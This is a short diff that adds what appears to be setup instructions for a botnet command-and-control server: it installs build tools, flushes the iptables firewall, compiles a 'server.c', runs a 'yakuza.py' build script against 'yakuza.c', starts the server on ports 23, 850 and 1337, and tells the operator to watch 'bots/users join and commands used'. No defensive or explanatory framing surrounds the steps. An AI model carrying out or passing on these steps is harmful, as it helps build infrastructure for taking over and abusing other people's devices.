@@ -1,0 +1,8 @@
+yum install gcc screen nano httpd python perl -y;
+iptables -F; service iptables
+gcc server.c -o  server -pthread
+nano login.txt
+python yakuza.py yakuza.c 127.0.0.1
+screen ./server 23 850 1337
+
+screen -x (to see bots/users join and commands used)
